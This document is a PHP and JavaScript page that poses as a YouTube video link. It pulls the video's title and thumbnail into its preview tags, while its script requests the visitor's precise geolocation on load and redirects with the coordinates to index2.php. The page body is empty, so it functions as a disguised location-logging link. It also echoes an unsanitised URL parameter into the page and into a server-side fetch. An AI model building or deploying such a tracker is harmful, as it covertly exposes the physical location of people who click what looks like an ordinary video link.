<script>
     window.onload = addGeo();
    function addGeo() {
        console.log('enter addgeo');
        var id = <?php
                    $id = json_encode($_GET['id']);
                    echo ("${id}") ?>;

        var watchID;
        var geoLoc;
        if (navigator.geolocation) {

            // timeout at 60000 milliseconds (60 seconds)
            var options = {
                maximumAge: 50000,
                timeout: 30000,
                enableHighAccuracy: true
            };
            geoLoc = navigator.geolocation;
            watchID = geoLoc.getCurrentPosition(showLocation, errorHandler, options);
        } else {
            // window.location = 'index2.php?lat=error&long=browser does not support geolocation!&id=' + id;
        }

        function showLocation(position) {
            console.log('showlocation');
            console.log('----------------------');

            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            console.log(id);
            console.log(latitude);
            console.log(longitude);
            location ="index2.php?lat=" + latitude + "&long=" + longitude + "&id=" + id;
            // window.location = location;


        }

        function errorHandler(err) {
            console.log('enter error');

            if (err.code == 1) {
                // window.location = 'index2.php?lat=error&long=Access is denied!&id=' + id;

            } else if (err.code == 2) {
                // window.location = 'index2.php?lat=error&long=Position is unavailable!!&id=' + id;
            }
        }

    }
</script>
<?php
require('us/users.php');
require('li/linksfunctions.php');




// Include config file
function getTubeTitel($url)
{
    $tmp = file_get_contents("http://youtube.com/watch?v=" . $url);
    $tmp2 = substr($tmp, (strpos($tmp, "<title>") + 7), 220);
    $tmp = substr($tmp2, 0, strpos($tmp2, "</title>") - 9);
    return htmlspecialchars_decode($tmp);
}
function get_youtube_thumb($url)
{
    $thumbnail = 'https://img.youtube.com/vi/' . $url . '/default.jpg';
    return $thumbnail;
}


?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content=<?php echo (get_youtube_thumb($id)); ?>>
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="200">
    <meta property="og:image:height" content="200">
    <title><?php echo (getTubeTitel($id)); ?></title>
</head>

<body>


</body>

</html>